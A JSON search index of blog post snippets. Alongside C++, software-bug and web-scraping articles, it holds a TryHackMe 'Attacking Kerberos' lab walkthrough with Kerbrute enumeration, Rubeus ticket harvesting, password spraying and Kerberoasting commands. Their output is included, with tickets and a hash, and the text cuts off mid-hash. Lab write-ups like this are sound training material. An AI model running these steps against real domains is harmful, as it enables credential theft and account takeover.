long 4 digunakan untuk positive integer besar atau 0 (setara dengan unsigned long int) long long 8 digunakan untuk integer yang sangat besar (setara dengan long long int). unsigned long long 8 digunakan untuk integer positive yang sangat besar atau 0 (setara dengan unsigned long long int) long double 12 digunakan untuk bilangan floating-point besar signed char 1 digunakan untuk karakter (rentang dijamin -127 hingga 127) unsigned char 1 digunakan untuk karakter (rentang 0 hingga 255) Mari kita lihat beberapa contoh.long b = 4523232;long int c = 2345342;long double d = 233434.56343;short d = 3434233; // error! dari rangeunsigned int a = -5; // error! hanya dapat menyimpan angka positive atau 0Type Data TurunanType data yang diturunkan dari type data dasar adalah type turunan. Misalnya: array, pointer, function type, structures, dll.Kita akan belajar tentang type data turunan di tutorial selanjutnya." }, { "title": "C++ Comments", "url": "/cpp-comments/", "categories": "Programming CPP, CPP Introduction, C++ Comments", "tags": "Programming, C++, Comments, Single Line, Multi line, Debugging", "date": "2021-07-26 07:00:00 +0700", "snippet": "Dalam tutorial ini, kita akan belajar tentang komentar C++, mengapa kita menggunakannya, dan bagaimana menggunakannya dengan bantuan contoh.Comment C++ adalah petunjuk yang dapat ditambahkan oleh programmer untuk membuat code mereka lebih mudah dibaca dan dipahami. Comment diabaikan oleh compiler C++.Ada dua cara untuk menambahkan comment ke code: // -comment Baris Tunggal /* */ -comment Multi-baris Comment Satu BarisDi C++, setiap baris yang dimulai dengan Comment // adalah Sebagai contoh,// deklarasikan sebuah variableint a;// inisialisasi variable &#39;a&#39; dengan nilai 2a = 2;Di sini, kita telah menggunakan dua Comment satu baris: // deklarasikan sebuah variable // inisialisasi variable ‘a’ dengan nilai 2kita juga dapat menggunakan Comment satu baris seperti ini:int a; // deklarasikan sebuah variableComment multi-barisDi C++, setiap baris antara /* dan */ juga merupakan Comment. Sebagai contoh,/* deklarasikan variableuntuk menyimpan gaji karyawan*/int gaji = 2000;Syntax ini dapat digunakan untuk menulis Comment satu baris dan multi-baris.Menggunakan Comment untuk DebuggingComment juga dapat digunakan untuk menonaktifkan code agar tidak dieksekusi. Sebagai contoh,#include &amp;lt;iostream&amp;gt;using namespace std;int main() { cout &amp;lt;&amp;lt; &quot;beberapa code&quot;; cout &amp;lt;&amp;lt; &#39;&#39;kesalahan code; cout &amp;lt;&amp;lt; &quot;code lainnya&quot;; return 0;}Jika kita mendapatkan kesalahan saat menjalankan program, alih-alih menghapus code yang rawan kesalahan, kita dapat menggunakan comment untuk menonaktifkannya agar tidak dieksekusi; ini bisa menjadi alat debugging yang berharga.#include &amp;lt;iostream&amp;gt;using namespace std;int main() { cout &amp;lt;&amp;lt; &quot;beberapa code&quot;; // cout &amp;lt;&amp;lt; &#39;&#39;kesalahan code; cout &amp;lt;&amp;lt; &quot;code lainnya&quot;; return 0;}Mengapa menggunakan comment?Jika kita menulis comment pada code kita, akan lebih mudah bagi kita untuk memahami code di tersebut. Selain itu, akan lebih mudah bagi teman developer Anda untuk memahami code tersebut. Catatan: comment tidak boleh menjadi pengganti cara untuk menjelaskan code yang ditulis. Kita harus selalu menulis code yang terstructur dengan baik dan cukup jelas, kemudian gunakan comment.Sebagai aturan umum, gunakan comment untuk menjelaskan Mengapa Anda melakukan sesuatu daripada Bagaimana Anda melakukan sesuatu." }, { "title": "Get to know Bugs Causes and How to Solve them", "url": "/Causes-and-How-to-Solve-bugs/", "categories": "WebApp", "tags": "web, Techniques", "date": "2021-07-24 01:30:02 +0700", "snippet": "When interacting with hardware or software, have you ever heard or come across the term bug? The term bug, which is an English word, is of course not a beetle or insect as it means, but is more complex and can cause bad things to your software or hardware.By the way, you’ve probably heard of bugs in software or software more often, but did you know that bugs were originally found in hardware (hardware)? We will discuss more about what bugs are, their causes and how to fix them. Let’s see.What Are Bugs?Bugs are small errors found in hardware and software that can trigger errors to occur. Some people may be confused when it comes to distinguishing between bugs and errors. Simply put, bugs are the cause, while errors are the effect. If a bug is left unattended, or not handled quickly, it can damage hardware or software. This of course will annoy the user.Some examples of bugs that you may often find are blue screens when using a computer with the Windows operating system, software that often closes itself, certain functions that cannot run, or buildings and walls that can be penetrated while you are playing games. Furthermore, the website is also not free from bugs that can create security holes that can be exploited by hackers.Although most bugs are currently found in software, the term bug itself originates from the discovery of damage to the hardware you know. Precisely in the era of the 1940s when the first generation computer called the Harvard Mark II could not work normally. The authorized team then conducted a thorough inspection of the computer in order to find the cause.Long story short, a small insect was found on the relay panel F in the computer circuit. These findings were written to the record as “bugs” and the term is popular today in cases of minor errors in hardware or software.Causes of BugsThe presence of bugs in both hardware and software certainly has a cause. When you know these causes, you can determine the appropriate treatment method later. Here are some of the causes of the bug.Hasty WorkOne of the main reasons for the presence of bugs in hardware or software is due to the hasty process. Making an information technology device takes quite a long time. The reason is that these devices cannot be made instantly and require certain stages that are continuous with one another.Complex SoftwareBugs in software can occur because of the complexity of the software. The more complex the software, the more code and algorithms are used. Bugs can exist in these codes, causing errors when the software is used.Poor Team CommunicationHardware and software that are worked on by a team or group of people are vulnerable to bugs if communication between members is not good. Especially if the work is done separately so that intensive communication is needed when you want to combine these devices.Poor Code Change DocumentationOften bugs are found on a device because the developer is untidy or even forgot to record code changes. Changed code can of course affect algorithms and other functions. For example, if you edit function.php in WordPress with certain codes, it is possible that other functions will crash because there is a part of the code that created the bug.Problem Testing ProcessThe last cause of the occurrence of bugs is due to a problematic testing process. A device must be tested before being sent to the end user. Testing can be done by internal developers or external parties. If damage is found on the device, the developer can check again whether there is a bug or not.How to Fix BugsAfter all the knowledge above, of course we also need to know how to fix bugs so as not to damage our devices. There are several things you can do to fix this bug, here are the things.Do Tests RegularlyBefore releasing a device, it’s a good idea to regularly test the device. For example, if you are developing a cash register application, you can create a demo account to test the system first, as well as in other cases.Use External Testing ServicesSometimes we can’t find fault when doing independent testing, that’s when external tester services are needed. You can hire a software tester or the like to check your application. They will report any errors found and you can correct the findings.Streamline Code Structure and DocumentationIt’s a good idea to also tidy up the code structure. You can annotate each code group so you can easily find and fix them later. Also, document any code changes you made, so that if something goes wrong you can look at the documentation and make the right changes.Use Simple ToolsThere is nothing wrong if you use a native or native device . For example, using Native PHP in developing applications. However, it can increase the risk of bugs forming. To minimize bugs, you can use a framework like CodeIgniter or Laravel instead of native PHP.Hire or Present Bug HunterIf you have sufficient funds, you can also hire or bring in a bug hunter . Bug hunters are people who work to find bugs in software before the software is officially released. They are paid if they find a bug in the software.ConclusionBugs are small errors in hardware or software and can trigger errors. Almost all hardware and software can not be separated from this bug. After all, man-made can not escape from mistakes, right? Some of the causes of bugs are complex devices and poor hardware or software manufacturing management. This is exacerbated by the testing process that does not go well.But you don’t need to worry, this bug can be solved. One of them is using simple tools when developing software, applications, or websites." }, { "title": "What is Web Scraping and its Benefits", "url": "/webscrapping/", "categories": "WebApp", "tags": "webscrapping, Techniques", "date": "2021-07-24 01:30:01 +0700", "snippet": "If you manage e-commerce, then one of your needs to analyze your competitors is to do Web Scrapping. Then, how to develop a business with web scrapping? Well, in this article I want to share with you about the benefits of web scrapping before discussing web scrapping techniques which may be discussed in other articles. However, knowing more about its benefits is also very important.What is Web Scraping?But, before discussing the benefits of web scrapping, we need to know what web scrapping is? Well, web scrapping refers to the creation or use of computer software to collect data from all competitor websites or several competitor website pages.Even when doing web scrapping, you can download all website pages and also things related to the main aspects of a competitor’s website such as tags (titles) or the content of articles on the website for further analysis needs.Web Scrapping TechniquesNow everything has been made easier, to do your web scrapping has been facilitated by the existence of an extension in the browser and also the application. However, the results are not as good as the manual method and using coding. Well, in this article, we will briefly discuss web scrapping techniques and there are more or less six commonly used web scrapping techniques, including:Getting Data ManuallyThis is one of the simplest techniques where you can get other website data manually. This technique is quite time consuming, because you have to retrieve and also store the information that has been obtained one by one.Regular Expression TechniqueOne of the benefits of using this technique is the consistency of the syntax in various programming languages. This technique is a flexible technique. Plus by using this technique, you can get data by type such as price, product name and email address.HTML Parsing TechniquesThis method is done by sending an HTTP request to the server that stores the website data. By using this technique, you are not only doing web scrapping to websites that are static in nature.You can also get large amounts of data, but the drawback is that this technique can be prevented with a website protection. In fact, you can also be blocked from certain sites when you frequently use this technique.Techniques for Using Google SheetsWe know it as a Google application that is used to create spreadsheet files. Apparently, not only for these needs. You can also use Google Sheets to do web scrapping very easily.In addition to google sheets, you also need a browser that has the inspect element feature. Then, just copy the XPath expression from the website page element whose data you want to get into an IMPORTXML command which is usually already available in Google Sheets.Benefits of Web ScrappingFurthermore, after getting to know what web scrapping is and the techniques that are often used, below are 5 benefits that you can get with web scrapping:Monitoring CompetitorsThe e-Commerce market in Indonesia has indeed made a big spike, especially during the current pandemic and this digital retail market will continue to grow as digital devices can increasingly be integrated into our real lives and can change consumer behavior in shopping.The target market is getting easier to reach, but the competition is getting tougher and not a few feel that the digital space is getting narrower for new entrants. Is there a way for the business to survive? Then you need to study your competitors, as one of the ancient Chinese generals who we often know him with Sun Tzu said that “If you know your enemy and yourself, then you will never be defeated by him.” Well, this also applies in business.You can get data and also get to know competitors so you can make changes, namely by web scrapping techniques. As explained earlier that web scrapping is a technique to get information from products on competitor websites/e-commerce sites, so with this data you can determine new strategies so you don’t lose to competitors.In addition to products, you can also get advertising data for competitor products in the form of budget insights and so on. In fact, you can also get data in the form of product trend predictions.Price OptimizationIf you are an entrepreneur who has difficulty setting prices, then you can get price optimization from web scrapping techniques and this is very helpful. The problem with optimization is that we can’t balance the point where we can’t increase profits without losing customers.Remember the principle that customers are willing to pay more for a product with more value. Whereas in the digital retail business, it is important to improve your services where your competitors don’t exist and this is where web scrapping plays a role.With web scarpping you can get customer-related information, so you can find out how you can get increased customer satisfaction with your offer, one way is by refining your market strategy.With web scrapping too, you can set a dynamic pricing strategy. The digital business market is not static and you have to keep up with all the price changes that occur to maximize a service and profit. Web Scraping allows you to monitor changes in market prices and strategies for proper promotion.Personally TargetedWeb scrapping can make it easier for you to set personal targets based on your prospective customer data, so you can determine how to promote them. Usually the data you can get from web scraping is in the form of education of prospective customers, companies, their positions, gender and much more.With this data you can determine campaign strategies and you can also determine relevant niches to implement campaigns and send newsletters in bulk. However, make sure you always send information that is relevant to the interests of your customers.Investing DecisionWeb scrapping in the world of investment is not uncommon anymore. In fact, from time to time, many people have used web scrapping techniques to collect alternative data to avoid the risk of failure and this can help in detecting unexpected risks and more potential opportunities.Investment decisions are complex, because they usually involve a series of processes before deciding on the right step in preparing an investment decision. The most effective way to test past investments is through analysis of historical data. This can show you the causes of failure and success in investing in the past.As a means, web scrapping can extract historical data more effectively where you can enter the data into a database. So that investment companies by using the data that have been obtained can increase the accuracy of the results of their analysis by using this large data to increase the accuracy of the results of their analysis in making better decisions.Optimizing ProductsIt makes sense for anyone who searches for online reviews of a product before making a purchase. These reviews can influence a prospective customer’s purchase decision on our product deterministically. Therefore, we can analyze what our potential customers think of us to match their expectations.Say your product team is about to launch an assisted product. However, you are very worried about this new product and wonder if your latest product can make a breakthrough and help generate cash for your company or not. Well, it’s important to collect customer feedback to cross-check your product and make an improvement if a flaw is found.You can use sentiment analysis techniques more broadly to analyze the attitude of our customers, whether it can have a positive, neutral or even negative impact. However, this analysis requires a large amount of data. So that the process of collecting this big data becomes faster and saves a lot of time and energy, you can use web scrapping." }, { "title": "TryHackMe - Attacking Kerberos", "url": "/thm-attacking-kerberos/", "categories": "TryHackMe walkthroughs, Windows", "tags": "thm-windows, Active Directory, Domain Controller, Kerberos, kerbrute, Rubeus, harvesting tickets, Password Spraying, Kerberoasting, AS-REP Roasting, GetUserSPNs.py, GetNPUsers.py, Impacket, mimikatz, Pass The Ticket, password cracking, hashcat, skeleton key, backdoor, oscp-prep", "date": "2021-06-30 23:44:00 +0700", "snippet": "Kerberos (the windows ticket-granting service) can be attacked in multiple ways: Kerberoasting AS-REP Roasting Pass the ticket Golden/Silver Ticket and so on.This room from TryHackMe will cover all of the basics of attacking Kerberos using tools such Kerbrute, Rubeus, mimikatz and GetUserSPNs.py/GetNPUsers.py from Impacket.IntroductionKerberos authentication overviewSince Windows Server 2003, Kerberos is the default authentication protocol in Active Directory. The key idea behind Kerberos design is to prevent the use of fake credentials and to mitigate various network attacks. For more details, read this article from HackTricks.Terminology Abbreviation Term AS Authentication Service KDC Key Distribution Center SPN Service Principal Name TGS Ticket Granting Service TGT Ticket Granting Ticket Enumeration w/ KerbruteKerbrute is a popular enumeration tool used to brute-force and enumerate valid active-directory users by abusing the Kerberos pre-authentication.echo &quot;10.10.135.137 CONTROLLER.local&quot; &amp;gt;&amp;gt; /etc/hosts Note: By brute-forcing Kerberos pre-authentication, you do not trigger the account &amp;lt;p style=”color:#dc3410”;&amp;gt;failed to log on event which can throw up red flags&amp;lt;/p&amp;gt; to the &amp;lt;p style=&quot;color: #1092dc&quot;&amp;gt;blue team&amp;lt;/p&amp;gt;. When brute-forcing through Kerberos you can brute-force by only sending a single UDP frame to the KDC allowing you to enumerate the users on the domain from a wordlist.root@kali:~/thm/attacking-kerberos# ./kerbrute userenum --dc CONTROLLER.local -d CONTROLLER.local User.txt __ __ __ / /_____ _____/ /_ _______ __/ /____ / //_/ _ \\/ ___/ __ \\/ ___/ / / / __/ _ \\ / ,&amp;lt; / __/ / / /_/ / / / /_/ / /_/ __//_/|_|\\___/_/ /_.___/_/ \\__,_/\\__/\\___/ Version: v1.0.3 (9dad6e1) - 06/29/21 - Ronnie Flathers @ropnop2021/06/29 17:17:49 &amp;gt; Using KDC(s):2021/06/29 17:17:49 &amp;gt; CONTROLLER.local:882021/06/29 17:17:49 &amp;gt; [+] VALID USERNAME: admin1@CONTROLLER.local2021/06/29 17:17:49 &amp;gt; [+] VALID USERNAME: administrator@CONTROLLER.local2021/06/29 17:17:49 &amp;gt; [+] VALID USERNAME: admin2@CONTROLLER.local2021/06/29 17:17:49 &amp;gt; [+] VALID USERNAME: httpservice@CONTROLLER.local2021/06/29 17:17:49 &amp;gt; [+] VALID USERNAME: sqlservice@CONTROLLER.local2021/06/29 17:17:49 &amp;gt; [+] VALID USERNAME: machine1@CONTROLLER.local2021/06/29 17:17:49 &amp;gt; [+] VALID USERNAME: machine2@CONTROLLER.local2021/06/29 17:17:49 &amp;gt; [+] VALID USERNAME: user1@CONTROLLER.local2021/06/29 17:17:49 &amp;gt; [+] VALID USERNAME: user3@CONTROLLER.local2021/06/29 17:17:49 &amp;gt; [+] VALID USERNAME: user2@CONTROLLER.local2021/06/29 17:17:49 &amp;gt; Done! Tested 100 usernames (10 valid) in 0.449 secondsHarvesting &amp;amp; Brute-Forcing Tickets w/ RubeusRubeus (developed by HarmJ0y) is an adaptation of the kekeo toolset. It can be used for a variety of attacks such as bruteforcing password, password spraying, overpass the hash, ticket requests and renewals, ticket management, ticket extraction, harvesting, pass the ticket, AS-REP Roasting, and Kerberoasting.Harvesting tickets Harvest for TGTs every 30 seconds:controller\\administrator@CONTROLLER-1 C:\\Users\\Administrator\\Downloads&amp;gt;.\\Rubeus.exe harvest /interval:30 ______ _ (_____ \\ | | _____) )_ _| |__ _____ _ _ ___ | __ /| | | | _ \\| ___ | | | |/___) | | \\ \\| |_| | |_) ) ____| |_| |___ | |_| |_|____/|____/|_____)____/(___/ v1.5.0 [*] Action: TGT Harvesting (with auto-renewal) [*] Monitoring every 30 seconds for new TGTs [*] Displaying the working TGT cache every 30 seconds [*] Refreshing TGT ticket cache (6/29/2021 8:35:28 AM) User : CONTROLLER-1$@CONTROLLER.LOCAL StartTime : 6/29/2021 8:29:17 AM EndTime : 6/29/2021 6:29:17 PM RenewTill : 7/6/2021 8:29:17 AM Flags : name_canonicalize, pre_authent, initial, renewable, forwardable Base64EncodedTicket : doIFhDCCBYCgAwIBBaEDAgEWooIEeDCCBHRhggRwMIIEbKADAgEFoRIbEENPTlRST0xMRVIuTE9DQUyiJTAjoAMCAQKhHDAaGwZr cmJ0Z3QbEENPTlRST0xMRVIuTE9DQUyjggQoMIIEJKADAgESoQMCAQKiggQWBIIEEmdvHjkRAbLtKCupY1woKK9Llgz2ileRPz7g +mDEHBQ9JpIsxdZSxRah6KW6jgT6/JaxlNHRmdo1NuHY9fESCYc7Hzq4kgmikPjGNioSqW+TwaZGA3Hj4bq6XnoAmrA0ne7kKNET qJBLgdwebcUjPK/+GmxXwjWgqk2SahEWbzr6nJyg5CJ9IGCJ1v34i4gK9o4cnnpxAdkVbtM0EQQsAymx6srwAIm2uBTGYUI2tlgO +wuVclPF+scfxEH9Ys8qjd/Fj888hcL40LpEwKgipNdYochB8JtddyJT/l13xC0LCVeckuF4EML99LMXnu4cdlRCgOw7riltq8mK 5VxCI8AsIJYCrXf2Cpl9mtZo9jScFr36Vr9qHrwe2oMD4kALiI5u2UmFO2w+s6eWqB8Qtxcvs0p4fgYhxSdUY9OfvYbp+jhxwLfq o0+uP4NhXMUUQrx66jss995AAh0kLiezB3GHMrdWGbwFyM69GtJ6E25tpTQRWZEV1NWKm0jWRCsC24qbDtiGPHJ7BrUgVoDzD2V3 Pw1ANh2P54giuHI/bqsbv2c/VHRyOr7VIbfPqnjmRiLFhK5v1+IxjX8KMHCLB0bQ3MQcZeArQxr5/NLJflCvY0MWyAoRfmUPAdgb Mb9+Xb8lvZk3xK2C0ttfDEmOvZkYl+zGSHEEFBf8J73GynKrPEBuIwbYXV6Mn9A9g0UWda0Wyvm5J8i/If7lmTszh8x+VWUGKfsX O3MX4l1geo28lzW+0N7BntrRc9iEj7dcdwZI3AJxDQvJNY6lPVXtKYa4KzB5/rg6cRrFxyu/zlxmPCmNfirI3fuVK7coLe4oy/jn AaPtKQao2hUJNV6/V4c/9iWjNpmZbxM2ElQhVfE5TSRATsGVPPKKhwyBumZ9yJpYhxQ261TzFawu3cMbQ3SAnmWIL2u+U3cRNp/W AzxRSSeGzZ3HsA+Q9fjoXAV3jvmJ1M5rS5WExHuUP+Dl1n0NA9RgLvl46p2Xs305fWQ+I/Yw1QZZHmj1oyqUZSDe0DJyYs6+rvhB sEPCl1A+e6HIeWMSCQezTY+zHUlDcRcbo2NyL4FDJi1fad2vObQtLXKlajaGNLIkQXs59o9wEdLCK2qk2+UY4gYDsOO0K6Fkv6l2 D185vPBy6Ur8YaVhp6gfDTu25vLRBVqgNZ2rnxX88m1PcDjxvWlyNly4IquaLLGTzSEK/WhGs1R5uTNtUMrAK8pQZKKgSPDqDzNS K9OnkfE1Ef3Y2FirY2aT1HcTllcLTXbHph2u9tvQyz86vM3gEu2uHkMFQxDgFqsNbl8MW7mT1/c8rQfYJMc7/Jvb32Vhgn2EAiez CTplu4RTXSoCA6Mt++zZ/pCRJsuslAlerFhGr0c/lsfC4sCFSQ/lv4+jgfcwgfSgAwIBAKKB7ASB6X2B5jCB46CB4DCB3TCB2qAr MCmgAwIBEqEiBCBo/FUoM1flNxmreK8eJA83icVDX3uO3mmtKCjTeNNyjKESGxBDT05UUk9MTEVSLkxPQ0FMohowGKADAgEBoREw DxsNQ09OVFJPTExFUi0xJKMHAwUAQOEAAKURGA8yMDIxMDYyOTE1MjkxN1qmERgPMjAyMTA2MzAwMTI5MTdapxEYDzIwMjEwNzA2 MTUyOTE3WqgSGxBDT05UUk9MTEVSLkxPQ0FMqSUwI6ADAgECoRwwGhsGa3JidGd0GxBDT05UUk9MTEVSLkxPQ0FM User : Administrator@CONTROLLER.LOCAL StartTime : 6/29/2021 8:23:09 AM EndTime : 6/29/2021 6:23:09 PM RenewTill : 7/6/2021 8:23:09 AM Flags : name_canonicalize, pre_authent, initial, renewable, forwardable Base64EncodedTicket : doIFjDCCBYigAwIBBaEDAgEWooIEgDCCBHxhggR4MIIEdKADAgEFoRIbEENPTlRST0xMRVIuTE9DQUyiJTAjoAMCAQKhHDAaGwZr cmJ0Z3QbEENPTlRST0xMRVIuTE9DQUyjggQwMIIELKADAgESoQMCAQKiggQeBIIEGmT7VabFNFCKPCQv8oWX6WFDFInbQ3yQP45v Qpqth8HdwoG5IG8bVqY0yJ7Myc5O9u/JsRciohcQ4YuFHYmMDNOcDYkf4DR7ugrVah+8+kjykZYFAUk9x4D29EZ3y5u8Zu5I4HuE LTUkq3whclttk5I7k3Bz1Z7Reg/HttkPTrXq1LTMOvXMhtdU4Jt+h+Qs2J33rqyvKlHQnUFIAvRnzhOF/IHtW6HuEFvS5woO1IVM 7k9aPS3vZk2Na3sTPuQk2ItecSjLPCBO9wA3tt7i7dN2iNlJD38Jr50aZBC3rzkS92eiXAnMMz53hZgbGnyeCso1CEIYcEUF7mkz J2kbDc558bz3E3WhxV7w/guE7hTq7jC2mQK9ND00j2+QhBva2A/uvqu0T0CQjgiPtqmEDN4HagWQEXSIoplUH9wbwmNC0ySz4Qcy /vcE4v6z2bGLL8S9a+lPuHGndCbr5TLxkPL0ss/3Dboq9gUNtoj5cUOF+jud314PrxtDKIQAp34lgvRpeJEG9/tUyZspyIg6J8/H 5exmBa1Ln4hFeujNV7kOLbxylV6/Cy6UWfjWvf1ndftwnYD9ciTRQcP5l1PiOdxkrteH+4pJ8RccT4+2Z/GHR06Giuer2wkHKhZx 1RAEWCDJuulKkKatHB90zydhsjHm5amZbsxBMkhyq7a5tEjd5qzx3yyf3eBq9FuoDV2vJ5kQmaxPndsVeub50TeuK6cPG7F8T+tx 27CL0MUTev8Wix+GJnxZg+7Pzmgf5pfikI0QicRvsbQZLYS01LsZc9doffXARUHsbWqi712b/uapr/aubY6/STzBMwPV//mKHEca bbd26M0IeGumWuUu30BRvnrfJWyF5P5tYmxv4/+PRVZXyHKU0M1fOx9QeMp/K+KQ7zYhnKbGh/HRNkdBfZ/bf7/GzjiTsOrv1ddF XEsQfsvySOy+cCWj9YjpVxam4eh6OnpohYx4mrlVFQ0+t79ZQ+EMw5I1MExao1cOw8lYWWU2aB6yYW80OdEmH69rUY5zTgulB1oO UU81kWBMWJB3Qp2pYl2xQNKkPiALIvA5imdEc0OQH0n/1fVXnnSS6ldKw+XWNQV9i9/IlGxeYK/xio4gT97qN581o4nZ+K5imziQ FZJejnZ+2clNMs15opvT+EBNxtGzPgT/91x4DJprYyePjWH71ojHAiPwVSG6Y7v0Mo776S/0YAyzKlvMjDt+Tpo9qpfF1vsNjIZM TTq7JywUWD2ZjWkfEapeU44OqL/FgV2BtL+BWSIQ/rg72cP8nbx2vV9B82mm1zpeRGl160vGrSGeIwP/HZ49v4cJfE9WZUTJ52QD 99Es9VVORDmb1ebzKYSBiQPUVwDd/ivSP51+uoN+nsOIjjLMr9mg3ReBXYhe+8dW+qOB9zCB9KADAgEAooHsBIHpfYHmMIHjoIHg MIHdMIHaoCswKaADAgESoSIEID51zHt+MlCjfRFfb3s1wpMbS+Ey+Zv9eNReu6jGw6vhoRIbEENPTlRST0xMRVIuTE9DQUyiGjAY oAMCAQGhETAPGw1BZG1pbmlzdHJhdG9yowcDBQBA4QAApREYDzIwMjEwNjI5MTUyMzA5WqYRGA8yMDIxMDYzMDAxMjMwOVqnERgP MjAyMTA3MDYxNTIzMDlaqBIbEENPTlRST0xMRVIuTE9DQUypJTAjoAMCAQKhHDAaGwZrcmJ0Z3QbEENPTlRST0xMRVIuTE9DQUw=Password sprayingWhen brute-forcing passwords you use a single user account and a wordlist of passwords to see which password works for that given user account.In password spraying, you take a given Kerberos-based password (such as P@$$W0rd) and “spray” against all found user accounts in the domain to find which one may have that password.This will result in a .kirbi ticket (a TGT) that can be used in order to get service tickets (TGS) from the KDC as well as to be used in attacks like the pass the ticket attack.controller\\administrator@CONTROLLER-1 C:\\Users\\Administrator\\Downloads&amp;gt;echo 10.10.135.137 CONTROLLER.local &amp;gt;&amp;gt; C:\\Windows\\System32\\drivers\\etc\\hostscontroller\\administrator@CONTROLLER-1 C:\\Users\\Administrator\\Downloads&amp;gt;Rubeus.exe brute /password:Password1 /noticket ______ _ (_____ \\ | | _____) )_ _| |__ _____ _ _ ___ | __ /| | | | _ \\| ___ | | | |/___) | | \\ \\| |_| | |_) ) ____| |_| |___ | |_| |_|____/|____/|_____)____/(___/ v1.5.0[-] Blocked/Disabled user =&amp;gt; Guest[-] Blocked/Disabled user =&amp;gt; krbtgt[+] STUPENDOUS =&amp;gt; Machine1:Password1[*] base64(Machine1.kirbi): doIFWjCCBVagAwIBBaEDAgEWooIEUzCCBE9hggRLMIIER6ADAgEFoRIbEENPTlRST0xMRVIuTE9DQUyi JTAjoAMCAQKhHDAaGwZrcmJ0Z3QbEENPTlRST0xMRVIubG9jYWyjggQDMIID/6ADAgESoQMCAQKiggPx BIID7X5jDNej2iF5f1pJiq0CyaD/RNnxz3MLWVY0/KlZceZruw9O6eN4gptAKWdIbP1B8+FiBERdxF6R hSzgQLpd6buWMjZzY165bGBpGK9Dd3t989gboqKvD1wXon7I4CVFnaEW8TnSyUauPdMFYft8V+ilE7Kt M5C9PI9TSPJyaUkTOS0NZvqiNrWBuD4qq8rtQERSQADejaMfQibusIj4WkycUUxvMC4wXsAIMoEBD9YM Ta2ZJgBrbiZ98Gkg3nyHl4YQ0QK+wEYiN7T+/MPc6PLkijsMNsHVG41OmokxfKv3vXqmWdLqIScm7z2f 5VB4q+MhrxL8RupeE5s2Q++mGtnuyyUHxaMHg7pwRsGuxAASAF6KfIGNMjoO82i7ui+1//8EEF7SstZX OOqh4wlSRdup5Xh8AxOj0u9Tzgw3ivIreqVP7VXtpRhwnvPrf3cENbNs4ENiCyIfVCWVXAnKYAnkf7gf WyTUEnODw0dP9MlHGglN6d8rrZWk9jEWISvInmgk+MrnXeALRwF8q134idvz3v2DxF5aULdM4HV02xIo VEY51+I4gxaTlEkuQsVPiJtcQeiuyX6OITsl4F6bkKd2OVIIQ1LdITDMJzuoIqbGM+kpuOEODBTctLRd 7i6dsihQ+bZf6TWi6NJ4f/ZPDd9dTOOtjVaQvi3NlCjMBcZtsuRgC53ieiGq7/54P6ZqE5InZZK1mllM Gg2bryfL5uOyQu0mMfuXO7ZrhSqLoRiojF3KS/aTXOWT68GjmUQ+zLNmFcGjSz7gctroHxdz9SRiQezy KwnGMa8ijzvkrFuUiO0y2m7TicWigN795b30pmwBA38qN6DR5h9B1aiBoiSO8AuKRLnajMZXIfh95RUd 78UCuOSF09MsDc5ipPlqoIpo3SvNzqGikeeIt4GSkV9Nfx5NbWXSvOoOz5slLtE0uivrrbmOzxydqkRE Y8215pLrqap/gUBuC7UcYszbUWQQpz4oRpzSrKhRECEar78AHaPEEoSNxNdbT991JJJF4IBbyQNLnKzG K5ZgQrsMNUW2hWDDVfhuFtAi4UwNoWyxWZDyeWnkq8/btVYx+XlaQsK0vO4TfIgCPPuXiEWWSWxQhQwO FN3NW5mzdvGMtPLS4qdzZuzx7FWTpLfQWFTMOKhbSuMDDYueVls/kexouBiZTB8zZ3+QQ+dmJUCwFUzu 98CQyvuv5iDOzP5bsRxhSXlfvD6Dm+rIjL9jntbFwYyj588vpegMVaznikdmEJAumOHRrQgHBqBRhR5V al2bgh0y00Lo8zCjqy+c5CiQp+YFJi3+JeQIGKsqV2h4+cbhrxKIlnQqExawZJtpQKOB8jCB76ADAgEA ooHnBIHkfYHhMIHeoIHbMIHYMIHVoCswKaADAgESoSIEIKhyMZpMwU215u2/yya0NkPY1pJq3H9mhIzm fyqKZST1oRIbEENPTlRST0xMRVIuTE9DQUyiFTAToAMCAQGhDDAKGwhNYWNoaW5lMaMHAwUAQOEAAKUR GA8yMDIxMDYyOTE1NDYxMVqmERgPMjAyMTA2MzAwMTQ2MTFapxEYDzIwMjEwNzA2MTU0NjExWqgSGxBD T05UUk9MTEVSLkxPQ0FMqSUwI6ADAgECoRwwGhsGa3JidGd0GxBDT05UUk9MTEVSLmxvY2Fs[+] DoneKerberoastingKerberoasting allows a user to request a service ticket for any service with a registered SPN then use that ticket to crack the service password.Method 1: using Rubeus (local) Dump the Kerberos hash of any kerberoastable users:controller\\administrator@CONTROLLER-1 C:\\Users\\Administrator\\Downloads&amp;gt;Rubeus.exe kerberoast ______ _ (_____ \\ | | _____) )_ _| |__ _____ _ _ ___ | __ /| | | | _ \\| ___ | | | |/___) | | \\ \\| |_| | |_) ) ____| |_| |___ | |_| |_|____/|____/|_____)____/(___/ v1.5.0 [*] Action: Kerberoasting [*] NOTICE: AES hashes will be returned for AES-enabled accounts. [*] Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts. [*] Searching the current domain for Kerberoastable users [*] Total kerberoastable users : 2 [*] SamAccountName : SQLService [*] DistinguishedName : CN=SQLService,CN=Users,DC=CONTROLLER,DC=local [*] ServicePrincipalName : CONTROLLER-1/SQLService.CONTROLLER.local:30111 [*] PwdLastSet : 5/25/2020 10:28:26 PM [*] Supported ETypes : RC4_HMAC_DEFAULT [*] Hash : $krb5tgs$23$*SQLService$CONTROLLER.local$CONTROLLER-1/SQLService.CONTROLLER.loca l:30111*$C1FB84AE1BCCD689EC61B42D94D99353$72D8CAEF2F50BF8BB9B5B5AB19F264DD335B2B 11E708D0C82796DA03558CD3F741A400384415D8A0495538E0765C274898810127B55DC702FA7A15 BADA61BA29D0F47620B05A2F20B6CDB19C62491947089784AA31461D48616619712EA405A08471A5 D5F39E3D09C1834D19BC6943200B9E85C6FB1C9B9D22C449DB2C0E70A74A612A3922A832A06BF170 3F755CB991925565A1C43F0654756ABDB11D4036CC4C29F8D035CD6029A4033FEC627ADA2CAC77B5 CBD9337DB419E59099D1F6D8FCDF083BD51696ADCED0338A5F91F756A3CEF5F8EDBBEF2F437413C8 3CC74E6EBC6CF9B5BB129E312DA4CE0B563E1BBF7FF09612FC74DBB7C72DDD660C13DB28AEF0E56C A6990232DEFA5B8B635ED1C8016FAEFAA2EB9A86689A8CDF33854B40CF7048E01AD967B462CCD014 D6B6BD3ABF576C932317555F714426D611AE0E609F2356F9E185A47AFD57107DEAFE2F90DF392B11 B8F8DB5A5D88EBBAE8852EDA3B9C093C69336B4C7DC4E102C1A02ECF61BE0C142F8CFAAFB34E510E 